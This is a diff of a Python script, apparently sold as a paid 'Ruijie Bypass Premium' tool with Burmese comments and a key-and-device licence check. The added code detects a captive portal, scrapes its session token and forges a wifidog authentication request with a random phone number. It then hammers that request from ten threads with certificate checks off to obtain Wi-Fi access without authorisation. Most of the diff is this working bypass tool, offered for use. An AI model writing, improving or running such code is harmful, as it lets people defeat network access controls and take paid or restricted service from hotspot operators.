@@ -1,13 +1,44 @@
 import requests
+import re
+import urllib3
+import time
+import threading
+import logging
+import random
 import sys
 import uuid
 import os
+import datetime
+from urllib.parse import urlparse, parse_qs, urljoin
 
-# --- CONFIGURATION ---
-# ဒီနေရာမှာ key.txt ရဲ့ Raw Link ကို ထည့်ပေးထားပါတယ်
+# SSL Warning များ ပိတ်ထားခြင်း
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ===============================
+# CONFIGURATION
+# ===============================
 KEY_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
+PING_THREADS = 10
+MIN_INTERVAL = 0.01
+MAX_INTERVAL = 0.1
+DEBUG = False
 
+# COLORS
+RED = "\033[91m"
+GREEN = "\033[92m"
+CYAN = "\033[96m"
+YELLOW = "\033[93m"
+MAGENTA = "\033[95m"
+WHITE = "\033[97m"
+RESET = "\033[0m"
+
+stop_event = threading.Event()
+
+# ===============================
+# LICENSE & HWID SYSTEM
+# ===============================
 def get_hwid():
+    """Device ID (HWID) ကို ထုတ်ယူခြင်း သို့မဟုတ် အသစ်ဆောက်ခြင်း"""
     id_file = os.path.expanduser("~/.zyan_hwid")
     if os.path.exists(id_file):
         with open(id_file, "r") as f:
@@ -18,48 +49,154 @@ def get_hwid():
         f.write(new_id)
     return new_id
 
-def check_key():
+def verify_access():
+    """Key, HWID နှင့် Expiry Date အားလုံးကို စစ်ဆေးခြင်း"""
     my_hwid = get_hwid()
-    print("====================================")
-    print("      ZYAN BYPASS - PREMIUM TOOL    ")
-    print(f"    YOUR DEVICE ID: {my_hwid}")
-    print("====================================")
+    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+    print(f"{MAGENTA}    RUIJIE BYPASS PREMIUM - AUTHENTICATION{RESET}")
+    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+    print(f"{WHITE}[#] YOUR DEVICE ID: {YELLOW}{my_hwid}{RESET}")
+    print(f"{CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
     
-    user_key = input("[?] Enter Your Key: ").strip()
+    user_key = input(f"{WHITE}[?] Enter Your Premium Key: {RESET}").strip()
+    
+    if not user_key:
+        print(f"{RED}[!] Key cannot be empty!{RESET}")
+        return False
+
+    print(f"{YELLOW}[*] Validating with server...{RESET}", end="\r")
     
     try:
-        response = requests.get(KEY_URL, timeout=10)
-        if response.status_code != 200:
-            print("[!] Cannot connect to server!")
-            return False
-            
-        for line in response.text.splitlines():
-            if "|" in line:
-                key, hwid = line.split("|")
-                if user_key == key.strip() and hwid.strip() == my_hwid:
-                    print("\n[+] Key Authorized! Access Granted.")
-                    return True
+        today = datetime.date.today()
+        response = requests.get(KEY_URL, timeout=15)
         
-        print("\n[!] Key Invalid or Already Used on Another Device!")
-        return False
+        if response.status_code == 200:
+            lines = response.text.splitlines()
+            for line in lines:
+                if "|" in line:
+                    # Format: Key|HWID|YYYY-MM-DD
+                    parts = line.split("|")
+                    if len(parts) == 3:
+                        db_key, db_hwid, db_exp = [p.strip() for p in parts]
+                        
+                        if user_key == db_key and my_hwid == db_hwid:
+                            exp_date = datetime.datetime.strptime(db_exp, "%Y-%m-%d").date()
+                            
+                            if today <= exp_date:
+                                remaining = (exp_date - today).days
+                                print(f"{GREEN}[✓] Access Granted! ({remaining} days remaining)   {RESET}")
+                                time.sleep(1.5)
+                                return True
+                            else:
+                                print(f"{RED}[X] Key Expired on {db_exp}!               {RESET}")
+                                return False
+            
+            print(f"{RED}[X] Invalid Key or Device ID! Access Denied.      {RESET}")
+            return False
+        else:
+            print(f"{RED}[!] Server Error: {response.status_code}              {RESET}")
+            return False
     except Exception as e:
-        print(f"\n[!] Connection Error: {e}")
+        print(f"{RED}[!] Verification Failed: Check your connection.      {RESET}")
         return False
 
-def start_bypass():
-    print("\n[*] Initializing... Successfully Connected!")
-    print("[*] Engine Status: ZYAN TURBO ACTIVE")
+# ===============================
+# NETWORK UTILITIES
+# ===============================
+def check_real_internet():
     try:
-        while True:
-            pass
-    except KeyboardInterrupt:
-        print("\n[!] Closing ZYAN Bypass...")
-        sys.exit()
+        requests.get("http://www.google.com", timeout=3)
+        return True
+    except:
+        return False
 
-if name == "main":
-    if check_key():
-        start_bypass()
-    else:
+def high_speed_ping(auth_link, sid):
+    session = requests.Session()
+    headers = {'User-Agent': 'Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36'}
+    while not stop_event.is_set():
+        try:
+            session.get(auth_link, headers=headers, timeout=5, verify=False)
+            print(f"{GREEN}[✓]{RESET} SID: {sid[:8]}... | Pulse Active 🔥   ", end="\r")
+        except:
+            break
+        time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
+
+# ===============================
+# MAIN ENGINE
+# ===============================
+def start_engine():
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
+    logging.info(f"{CYAN}System Initializing...{RESET}")
+
+    while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
+
+        try:
+            r = requests.get(test_url, allow_redirects=True, timeout=10)
+
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{YELLOW}[•]{RESET} Status: Online & Stable. Monitoring... ", end="\r")
+                    time.sleep(5)
+                    continue
+
+            portal_url = r.url
+            parsed_portal = urlparse(portal_url)
+            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
+
+            print(f"\n{CYAN}[!] Captive Portal Found: {portal_host}{RESET}")
+
+            res_portal = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", res_portal.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            
+            res_final = session.get(next_url, verify=False, timeout=10)
+            sid = parse_qs(urlparse(res_final.url).query).get('sessionId', [None])[0]
+            
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', res_final.text)
+                sid = sid_match.group(1) if sid_match else None
+
+            if sid:
+                print(f"{GREEN}[✓]{RESET} Bypass Token Acquired: {sid}")
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                gw_port = params.get('gw_port', ['2060'])[0]
+
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={random.randint(10000,99999)}"
+
+                print(f"{MAGENTA}[*] Engaging Turbo Threads ({PING_THREADS})...{RESET}")
+                for _ in range(PING_THREADS):
+                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
+
+                while check_real_internet():
+                    time.sleep(10)
+                    if stop_event.is_set(): break
+            else:
+                time.sleep(3)
+
+        except Exception as e:
+            time.sleep(5)
+
+# ===============================
+# ENTRY POINT
+# ===============================
+if __name__ == "__main__":
+    try:
+        if verify_access():
+            print(f"""{MAGENTA}
+  ██████╗ ██╗   ██╗██╗     ██╗██╗███████╗
+  ██╔══██╗██║   ██║██║     ██║██║██╔════╝
+  ██████╔╝██║   ██║██║     ██║██║█████╗  
+  ██╔══██╗██║   ██║██║██   ██║██║██╔══╝  
+  ██║  ██║╚██████╔╝██║╚█████╔╝██║███████╗
+  ╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚════╝ ╚═╝╚══════╝{RESET}""")
+            start_engine()
+        else:
+            input(f"\n{WHITE}Press Enter to exit...{RESET}")
+            sys.exit()
+    except KeyboardInterrupt:
+        stop_event.set()
+        print(f"\n{RED}[!] Engine Forcefully Stopped.{RESET}")
         sys.exit()
-                 
-                
